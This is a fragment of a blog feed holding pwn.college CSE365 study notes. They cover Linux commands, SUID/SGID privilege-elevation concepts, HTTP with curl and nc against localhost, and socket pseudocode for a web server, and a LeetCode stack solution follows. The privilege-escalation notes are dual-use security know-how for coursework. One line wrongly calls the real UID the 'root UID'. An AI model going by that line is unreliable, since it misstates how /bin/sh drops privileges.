强行压缩文件。不理会文件名称或硬连接是否存在以及该文件是否为符号连接。</li><li>-l或–list 　列出压缩文件的相关信息。</li><li>-t或–test 　测试压缩文件是否正确无误。</li><li>-d或–decompress或—-uncompress 　解开压缩文件。</li></ul></li><li><p><code>bzip2</code>采用新的压缩演算法, bbzip2压缩完文件后会产生.bz2的压缩文件，并删除原始的文件。</p><ul><li>-c或–stdout 　将压缩与解压缩的结果送到标准输出。</li><li>-d或–decompress 　执行解压缩。</li><li>-f或–force 　bzip2在压缩或解压缩时，若输出文件与现有文件同名，预设不会覆盖现有文件。若要覆盖，请使用此参数。</li><li>-t或–test 　测试.bz2压缩文件的完整性。</li></ul></li><li><p><code>zip</code> 是个使用广泛的压缩程序，压缩后的文件后缀名为 <strong>.zip</strong>。</p><ul><li>-q 不显示指令执行过程。</li><li>-r 递归处理，将指定目录下的所有文件和子目录一并处理。</li><li>-b&lt;工作目录&gt; 指定暂时存放文件的目录。</li><li>-d 从压缩文件内删除指定的文件。</li></ul></li><li><p><code>tar</code> 是用来建立，还原备份文件的工具程序，它可以加入，解开备份文件内的文件。</p><ul><li>-c或–create 建立新的备份文件。</li><li>-d或–diff或–compare 对比备份文件内和文件系统上的文件的差异。</li><li>-f&lt;备份文件&gt;或–file&#x3D;&lt;备份文件&gt; 指定备份文件。</li><li>-z或–gzip或–ungzip 通过gzip指令处理备份文件。</li><li>-v或–verbose 显示指令执行过程。</li></ul></li><li><p><code>ar</code>可让您集合许多文件，成为单一的备存文件。在备存文件中，所有成员文件皆保有原来的属性与权限。</p><ul><li><pre><code>-r:The file is inserted into the backup file-v:show the detail information-d 　删除备存文件中的成员文件<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">19. **`cpio`**: used to backup file</span><br><span class="line"></span><br><span class="line">    - -o或--create 　执行copy-out模式，建立备份档。</span><br><span class="line"></span><br><span class="line">20. `find`:find [路径] [匹配条件] [动作]</span><br><span class="line"></span><br><span class="line">    - `-name pattern`：按文件名查找，支持使用通配符 `*` 和 `?`。</span><br><span class="line">    - `-type type`：按文件类型查找，可以是 `f`（普通文件）、`d`（目录）、`l`（符号链接）等。</span><br><span class="line">    - `-size [+-]size[cwbkMG]`：按文件大小查找，支持使用 `+` 或 `-` 表示大于或小于指定大小，单位可以是 `c`（字节）、`w`（字数）、`b`（块数）、`k`（KB）、`M`（MB）或 `G`（GB）。</span><br><span class="line">    - `-user username`：按文件所有者查找。</span><br><span class="line">    - `-mtime days`：按修改时间查找，支持使用 `+` 或 `-` 表示在指定天数前或后，days 是一个整数表示天数。</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## Privilege Escalation</span><br><span class="line"></span><br><span class="line">① **permission model**</span><br><span class="line"></span><br><span class="line">Permissions: **r: 4 w: 2 x: 1**</span><br><span class="line"></span><br><span class="line">File: </span><br><span class="line"></span><br><span class="line">- first `rwx`: **owner user** </span><br><span class="line">- second `rwx`: **owner group** </span><br><span class="line">- third `rwx`: **other groups**</span><br><span class="line"></span><br><span class="line">default **UID: 1000**, **UID 0** is the Linux administrator user root</span><br><span class="line"></span><br><span class="line">② **Privilege elevation**</span><br><span class="line"></span><br><span class="line">run an suid binary such as `sudo`, `su`, `newgrp`(SUID is a bit in the Linux permission model)</span><br><span class="line"></span><br><span class="line">**SUID**: execute with the `eUID` of the file owner rather than the parent process.</span><br><span class="line"></span><br><span class="line">**SGID**: execute with the `eGID` of the file owner rather than the parent process.</span><br><span class="line"></span><br><span class="line">**Sticky**: used for shared directories to limit file removal to file owners.</span><br><span class="line"></span><br><span class="line">three different type of user and group IDs</span><br><span class="line"></span><br><span class="line">- **Effective(eUID,eGID):** used for most access checks--&gt;root:0</span><br><span class="line">- **Real(UID,GID):** true identity of the process owner, used for signal checks</span><br><span class="line">- **Saved:** used for temporarily dropping privileges</span><br><span class="line"></span><br></pre></td></tr></table></figure></code></pre></li></ul></li></ol><p>gcc -w:Does not generate any warning information.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><p>sudo chmod u+s xxx#SetUID bit, other users can have the file owner permissions<br>#user:rwx—&gt;rws<br>sudo chown root.root xxx #it will cancel the ‘s’ user:rws—&gt;rwx<br>sudo chmod g+s xxx #group:rwx—&gt;rws</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">## Program Misuse:Mitigations</span><br><span class="line"></span><br><span class="line">**command injection**</span><br><span class="line"></span><br><span class="line">**/bin/sh** SUID mitigation：</span><br><span class="line"></span><br><span class="line">if `/bin/sh` is run as SUID (eUID==0 but rUID !=0)</span><br><span class="line"></span><br><span class="line">it will drop privileges to the rUID(root UID) (eUID=rUID and rUID !=0)</span><br><span class="line"></span><br><span class="line">Mitigation: to disable `sh -p`</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># module2(Talking Web)</span><br><span class="line"></span><br><span class="line">static http request:</span><br><span class="line"></span><br><span class="line">- `GET /cat.gif HTTP/1.0`—&gt;</span><br><span class="line">- `HTTP/1.0 200 OK` &lt;—</span><br><span class="line"></span><br><span class="line">dynamic http request:</span><br><span class="line"></span><br><span class="line">- `GET /time?tz=UTC HTTP/1.0` —&gt;</span><br><span class="line"></span><br><span class="line">- ```</span><br><span class="line">  HTTP/1.0 200 OK</span><br><span class="line">  Content-Type: text/plain</span><br><span class="line">  Content-Length: 19</span><br><span class="line">  </span><br><span class="line">  2022-01-19 03:14:07 //&lt;——</span><br></pre></td></tr></table></figure><h2 id="Talking-Web-The-Internet"><a href="#Talking-Web-The-Internet" class="headerlink" title="Talking Web: The Internet"></a>Talking Web: The Internet</h2><p>TCP&#x2F;IP</p><ul><li>Link Layer(Physically link computers)</li><li>Internet Layer(Find the right computer:IP、ICMP、ARP)</li><li>Transport Layer(Find the right program:UDP、TCP)</li><li>Application Layer(Talk with the program:HTTP、FTP、SMTP、SSH)</li></ul><h2 id="Talking-Web-RFC-1945"><a href="#Talking-Web-RFC-1945" class="headerlink" title="Talking Web: RFC 1945"></a>Talking Web: RFC 1945</h2><p>①Hyper Transfer Protocol: HTTP is an application-level protocol</p><p>②Request-Line &#x3D; Method SP Request-URI SP HTTP-Version CRLF</p><p>SP: space, CRLF: \n</p><ul><li>Method: “GET” | “HEAD” | “POST”</li></ul><p>③Status-Line &#x3D; HTTP-Version SP Status-Code SP Reason-Phrase CRLF</p><p><strong>Status-Code Definition</strong></p><p>1xx: <strong>Informational</strong>-Not used, but reserved for futrue use</p><p>2xx: <strong>Success</strong>-The action was successfully received, understood, and accepted</p><p>3xx: <strong>Redirection</strong>-Further action must be taken in order to complete the request</p><p>4xx: <strong>Client Error</strong>-The request contains bad syntax or can’t be fulfilled</p><p>5xx: <strong>Server Error</strong>-The server failed to fulfill an apparently valid request</p><p>④ GET</p><blockquote><p><code>GET请求</code></p><p>GET &#x2F;greet HTTP&#x2F;1.0</p><p>Host: hello.example.com</p></blockquote><blockquote><p><code>服务器返回</code></p><p>HTTP&#x2F;1.0 200 OK</p><p>Content-Type: text&#x2F;html; charset&#x3D;UTF-8</p><p>Content-Length: 39</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;&lt;body&gt;Hello, World!&lt;/body&gt;&lt;/html&gt;</span><br></pre></td></tr></table></figure></blockquote><p>⑥ POST</p><blockquote><p><code>POST请求</code></p><p>POST &#x2F;greet HTTP&#x2F;1.0</p><p>Host: hello.example.com</p><p>Content-Length: 11</p><p>Content-Type: application&#x2F;x-www-form-urlencoded</p><p>name&#x3D;Connor</p></blockquote><blockquote><p><code>返回</code></p><p>HTTP&#x2F;1.0 200 OK</p><p>Content-Length: 0</p></blockquote><h2 id="Talking-Web-URLs-and-Encoding"><a href="#Talking-Web-URLs-and-Encoding" class="headerlink" title="Talking Web: URLs and Encoding"></a>Talking Web: URLs and Encoding</h2><p>① URL: <code>&lt;scheme&gt;://&lt;host&gt;:&lt;port&gt;/&lt;path&gt;?&lt;query&gt;#&lt;fragment&gt;</code></p><p>scheme: Protocol used to access resource</p><p>host: Host that holds resource</p><p>port: Port for program servicing resource</p><p>path: Identifies the specific resource</p><p>query: Information that the resource can use</p><p>fragment: Client information about the resource</p><p>②URL encoding</p><p>SP&#x3D;%20 #&#x3D;%23 &#x2F;&#x3D;%2F ?&#x3D;%3F A&#x3D;%41</p><p>③ Content-Type: Form</p><p>application&#x2F;x-www-form-urlencoded name&#x3D;xx</p><p>application&#x2F;json {“name”:”xx”}</p><h2 id="Talking-Web-State"><a href="#Talking-Web-State" class="headerlink" title="Talking Web: State"></a>Talking Web: State</h2><p>① HTTP is a stateless protocol</p><p><strong>solution:</strong> use HTTP Headers for maintaning state</p><ol><li>The server sets a cookie in a response with the header: <code>Set-Cookie</code></li><li>The client includes the cookie in future requests with the header: <code>Cookie</code></li></ol><h2 id="CURL"><a href="#CURL" class="headerlink" title="CURL"></a>CURL</h2><p>CURL（CommandLine Uniform Resource Locator），是一个利用 URL 语法，在命令行终端下使用的网络请求工具，支持 HTTP、HTTPS、FTP 等协议。</p><h3 id="1-1-基础语法"><a href="#1-1-基础语法" class="headerlink" title="1.1 基础语法"></a>1.1 基础语法</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl [options...] &lt;url&gt;</span><br></pre></td></tr></table></figure><h3 id="1-2-常用参数"><a href="#1-2-常用参数" class="headerlink" title="1.2 常用参数"></a>1.2 常用参数</h3><p>(1)Show Info</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">-v/--verbose                    # output details</span><br><span class="line">-H &#x27;Host:xxx&#x27;:       # 自定义 HTTP 头部, Host 头部通常用于指定要访问的主机名</span><br><span class="line">-d &quot;a=xxx&quot;#-d:--data <span class="language-xml"><span class="tag">&lt;<span class="name">data</span>&gt;</span></span>   HTTP POST data</span><br><span class="line">-XPOST/GET# 是指定什么类型(POST/GET/HEAD/DELETE/PUT/PATCH)</span><br><span class="line">-L#--location(HTTP/HTTPS)追随http响应头“Location：”定向到跳转后的页面；(在http响应码为3XX时使用，如301跳转、302跳转)</span><br><span class="line"></span><br><span class="line">curl 127.0.0.1:80 -H &#x27;Host:xxx&#x27; </span><br></pre></td></tr></table></figure><h3 id="传参数"><a href="#传参数" class="headerlink" title="传参数"></a>传参数</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">单个：</span><br><span class="line">curl -v 127.0.0.1:80?a=xxx</span><br><span class="line">curl -v 127.0.0.1:80/?a=xxx</span><br><span class="line"></span><br><span class="line">多个：</span><br><span class="line">curl -v 127.0.0.1:80?a=xxx&amp;b=xxx  #same as&#x27;curl -v 127.0.0.1:80?a=xxx#need to transfer meaning</span><br><span class="line">curl -v 127.0.0.1:80?a=xxx\&amp;b=xxx#get flag</span><br></pre></td></tr></table></figure><p><strong>特殊字符encoder</strong></p><table><thead><tr><th>tab</th><th>%9</th></tr></thead><tbody><tr><td>#</td><td>%23</td></tr><tr><td>“</td><td>%22</td></tr><tr><td>space</td><td>%20</td></tr><tr><td>!</td><td>%21</td></tr><tr><td>&amp;</td><td>%26</td></tr></tbody></table><p>etc.</p><h2 id="nc命令"><a href="#nc命令" class="headerlink" title="nc命令"></a>nc命令</h2><p>nc是netcat的简写，有着网络界的瑞士军刀美誉。因为它短小精悍、功能实用，被设计为一个简单、可靠的网络工具。比如大家很熟悉使用telnet测试tcp端口，而nc可以支持测试linux的tcp和udp端口，而且也经常被用于端口扫描，甚至把nc作为server以TCP或UDP方式侦听指定端口做简单的模拟测试。</p><p>Used to send and to monitor any TCP and UDP data, so we can simulate any client or server</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">$ nc 127.0.0.1 80</span><br><span class="line">#Simulate the HTTP request</span><br><span class="line">==============================================</span><br><span class="line">GET / HTTP/1.1#input</span><br><span class="line">host: localhost#127.0.0.1 either</span><br><span class="line"></span><br><span class="line">==============================================</span><br><span class="line">POST / HTTP/1.1</span><br><span class="line">Content-Length: 74</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">a=xxx&amp;b=xxx</span><br><span class="line">================================================</span><br><span class="line">POST / HTTP/1.1</span><br><span class="line">Content-Length: 123</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">&quot;a&quot;:&quot;xx&quot;,</span><br><span class="line">&quot;b&quot;:&#123;&quot;c&quot;: &quot;xxx&quot;, &quot;d&quot;: [&quot;xx&quot;, &quot;x xx&amp;xxx#xxxx&quot;]&#125;</span><br><span class="line">&#125;</span><br><span class="line">================================================</span><br></pre></td></tr></table></figure><h3 id="传参数-1"><a href="#传参数-1" class="headerlink" title="传参数"></a>传参数</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">单个：</span><br><span class="line">GET /?a=xxx HTTP/1.1 </span><br><span class="line"></span><br><span class="line">多个：</span><br><span class="line">GET /?a=xxx&amp;b=xxx HTTP/1.1 </span><br></pre></td></tr></table></figure><h1 id="module4-Building-a-Web-Server"><a href="#module4-Building-a-Web-Server" class="headerlink" title="module4(Building a Web Server)"></a>module4(Building a Web Server)</h1><h2 id="Building-a-Web-Server-Linux-Processes"><a href="#Building-a-Web-Server-Linux-Processes" class="headerlink" title="Building a Web Server: Linux Processes"></a>Building a Web Server: Linux Processes</h2><p><code>Linux的系统函数</code></p><p>①syscall</p><p><strong>read(int fd, void <code>\*</code>buf, size_t count)</strong> attempts to read up to count bytes from file descriptor fd into the buffer starting at buf.</p><p><strong>write(int fd, void <code>\*</code>buf, size_t count)</strong> writes up to count bytes from the buffer starting at buf to the file referred to by the file descriptor fd.</p><p><strong>open(char <code>\*</code>pathname, int flags, mode_t mode)</strong> opens the file specified by pathname. If the specified file doesn’t exist, it may optionally be created(if O_CREAT is specified in flags), the return value of it is a file descriptor that used in subsequent system calls(read(2),write(2),lseek(2),fcntl(2)) to refer to the open file.</p><p>②system calls</p><p>for more system call can see <a href="https://x64.syscall.sh/">this</a></p><h2 id="Building-a-Web-Server-Network-System-Calls"><a href="#Building-a-Web-Server-Network-System-Calls" class="headerlink" title="Building a Web Server: Network System Calls"></a>Building a Web Server: Network System Calls</h2><ol><li><p><img src="/2024/01/17/pwn-college/image-20240117224839466.png" alt="image-20240117224839466"></p></li><li><pre><code>struct sockaddr&#123;    uint16_t sa_family;// 2字节    uint8_t sa_data[14];// 1字节 x 14端口+IP&#125;;struct sockaddr_in&#123;    uint16_t sin_family;//2字节    uint16_t sin_port;//端口    uint32_t sin_addr;//IP    uint8_t __pad[8];//空&#125;<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">3. </span><br><span class="line"></span><br><span class="line">AF_INET is 2; [htons()](https://stackoverflow.com/questions/19207745/htons-function-in-socket-programing)function used to convert the number from little endian to big endian for networking work on big ending integers; `ipv4` address of 4 bytes is also big endian, the[inet_addr()](https://blog.csdn.net/ivnetware/article/details/78756321)function cverts an unsigned integer IP from a host end-order to a network end-order</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">`.ascii`, `.asciz`区别：`.asciz`会在末尾自动添加`\0`</span><br><span class="line"></span><br><span class="line">## 学习笔记</span><br><span class="line"></span><br><span class="line">使用socket创建一个A-B的网络文件，然后使用bind将socket与具体的ip绑定。使用listen来被动侦听sockfd。使用accept接受外部连接。</span><br><span class="line"></span><br><span class="line">使用TCP/IP进行网络通讯，服务器端的例子如：</span><br><span class="line"></span><br><span class="line">```cpp</span><br><span class="line">// int socket(int domain, int type, int protocol)</span><br><span class="line">socket_fd = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);</span><br><span class="line">    </span><br><span class="line">// int bind(int socket_fd, struct sockaddr* addr, socklen_t addrlen)</span><br><span class="line">/*</span><br><span class="line"> * struct sockaddr &#123;</span><br><span class="line"> *   uint16_t sa_family;</span><br><span class="line"> *   uint8_t  sa_data[14];   port + ip</span><br><span class="line"> * &#125;</span><br><span class="line"> * </span><br><span class="line"> * struct sockaddr_in &#123;</span><br><span class="line"> *   uint16_t sin_family;</span><br><span class="line"> *   uint16_t sin_port;port</span><br><span class="line"> *   uint32_t sin_addr;ip</span><br><span class="line"> *   uint8_t  __pad[8];not use</span><br><span class="line"> * &#125;</span><br><span class="line">*/</span><br><span class="line">    </span><br><span class="line">bind(socket_fd, &#123;sa_family=AF_INET, sin_port=htons(port), sin_addr=inet_addr(&quot;0.0.0.0&quot;)&#125;, 16);</span><br><span class="line"></span><br><span class="line">// int listen(int socket_fd, int backlog);</span><br><span class="line">listen(socket_fd, 0);</span><br><span class="line"></span><br><span class="line">while(1)</span><br><span class="line">&#123;</span><br><span class="line">    // int accept(int socket_fd, struct sockaddr* addr, socklen_t* addrlen);</span><br><span class="line">    tunnel = accept(socket_fd, NULL, NULL);</span><br><span class="line"></span><br><span class="line">    // receive http request: GET /file/xxx HTTP/1.0</span><br><span class="line">    // ssize_t read(int fd, void buf[.count], size_t count); read msg from client into [request]</span><br><span class="line">    // eg: GET /flag HTTP/1.0\r\n\r\n</span><br><span class="line">    read(tunnel, request, maxLength); // then extract the file path</span><br><span class="line"></span><br><span class="line">    if(request == GET)</span><br><span class="line">    &#123;</span><br><span class="line">        // open file and read file</span><br><span class="line">        file_fd = open(file_path, mode); // O_RDONLY, O_CREAT, O_WRONLY</span><br><span class="line">        valid_count = read(file_fd, file_content, maxLength); // read file content into file_content</span><br><span class="line">        // response</span><br><span class="line">        write(tunnel, &quot;HTTP/1.0 200 OK\r\n\r\n&quot;, 19);</span><br><span class="line">        write(tunnel, file_content, valid_count);</span><br><span class="line">        close(file_fd);</span><br><span class="line">    &#125;</span><br><span class="line">    else if(request == POST)</span><br><span class="line">    &#123;</span><br><span class="line">        file_fd = open(file_path, mode); // O_WRONLY...</span><br><span class="line">        write(file_fd, POST_request_body, POST_request_body_length);</span><br><span class="line">        close(file_fd);</span><br><span class="line">        // response</span><br><span class="line">        write(tunnel, &quot;HTTP/1.0 200 OK\r\n\r\n&quot;, 19);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    close(tunnel);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">exit(0);</span><br></pre></td></tr></table></figure></code></pre></li></ol><h1 id="module5-Reverse-Engineering"><a href="#module5-Reverse-Engineering" class="headerlink" title="module5(Reverse Engineering)"></a>module5(Reverse Engineering)</h1><h2 id="学习笔记"><a href="#学习笔记" class="headerlink" title="学习笔记"></a>学习笔记</h2><p>Linux file命令用于辨识文件类型。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file [-bcLvz][-f &lt;名称文件&gt;][-m &lt;魔法数字文件&gt;...][文件或目录...]</span><br></pre></td></tr></table></figure><p><strong>参数</strong>：</p><ul><li>-b 　列出辨识结果时，不显示文件名称。</li><li>-c 　详细显示指令执行过程，便于排错或分析程序执行的情形。</li><li>-f&lt;名称文件&gt; 　指定名称文件，其内容有一个或多个文件名称时，让file依序辨识这些文件，格式为每列一个文件名称。</li><li>-L 　直接显示符号连接所指向的文件的类别。</li><li>-m&lt;魔法数字文件&gt; 　指定魔法数字文件。</li><li>-v 　显示版本信息。</li><li>-z 　尝试去解读压缩文件的内容。</li><li>[文件或目录…] 要确定类型的文件列表，多个文件之间使用空格分开，可以使用shell通配符匹配多个文件。</li></ul><p><img src="/2024/01/17/pwn-college/image-20240121164931795.png" alt="image-20240121164931795"></p><p>Linux strings命令</p><p>strings - print the strings of printable characters in files.</p><p>意思是， 打印文件中可打印的字符。 我来补充一下吧， 这个文件可以是文本文件（test.c）, 可执行文件(test), 动态链接库(test.o), 静态链接库(test.a)</p><p>Linux strip命令</p><p><strong>简单的说就是给文件脱掉外衣，具体就是从特定文件中剥掉一些符号信息和调试信息，使文件变小。</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://tech.c01dkit.com/pwn-college-cse365-spring2023/#building-a-web-server&quot;&gt;https://tech.c01dkit.com/pwn-college-cse365-sprin</summary>
      
    
    
    
    <category term="pwn_college" scheme="https://1xueyu1.github.io/categories/pwn-college/"/>
    
    
  </entry>
  
  <entry>
    <title>单调栈</title>
    <link href="https://1xueyu1.github.io/2023/12/21/%E5%8D%95%E8%B0%83%E6%A0%88/"/>
    <id>https://1xueyu1.github.io/2023/12/21/%E5%8D%95%E8%B0%83%E6%A0%88/</id>
    <published>2023-12-21T10:19:00.000Z</published>
    <updated>2023-12-21T10:24:18.545Z</updated>
    
    <content type="html"><![CDATA[<h2 id="单调栈"><a href="#单调栈" class="headerlink" title="单调栈"></a>单调栈</h2><p><a href="https://leetcode.cn/problems/trapping-rain-water/description/">42. 接雨水 - 力扣（LeetCode）</a></p><p>单调栈一般用于存放数组的<strong>下标</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">trap</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; height)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 单调栈，用于存放下标</span></span><br><span class="line">        stack&lt;<span class="type">int</span>&gt; st;</span><br><span class="line">        <span class="type">int</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; height.<span class="built_in">size</span>(); i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">while</span>(!st.<span class="built_in">empty</span>() &amp;&amp; height[i] &gt;= height[st.<span class="built_in">top</span>()])</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// 求中间的高度</span></span><br><span class="line">                <span class="type">int</span> bottom_h = height[st.<span class="built_in">top</span>()];</span><br><span class="line">                st.<span class="built_in">pop</span>();</span><br><span class="line">                <span class="comment">// 如果到边缘结束</span></span><br><span class="line">                <span class="keyword">if</span>(st.<span class="built_in">empty</span>())<span class="keyword">break</span>;</span><br><span class="line">                <span class="comment">// 待求面积的高，两边高度较小的减去中间的</span></span><br><span class="line">                <span class="type">int</span> dh = <span class="built_in">min</span>(height[i], height[st.<span class="built_in">top</span>()]) - bottom_h;</span><br><span class="line">                <span class="comment">// 乘上宽度即是面积</span></span><br><span class="line">                ans += dh * (i - st.<span class="built_in">top</span>() - <span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            st.<span class="built_in">push</span>(i);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="前后缀和-单调栈"><a href="#前后缀和-单调栈" class="headerlink" title="前后缀和+单调栈"></a>前后缀和+单调栈</h2><p><a href="https://leetcode.cn/problems/beautiful-towers-ii/description/?envType=daily-question&envId=2023-12-21">2866. 美丽塔 II - 力扣（LeetCode）</a></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">long</span> <span class="type">long</span> <span class="title">maximumSumOfHeights</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; maxHeights)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = maxHeights.<span class="built_in">size</span>();</span><br><span class="line">        stack&lt;<span 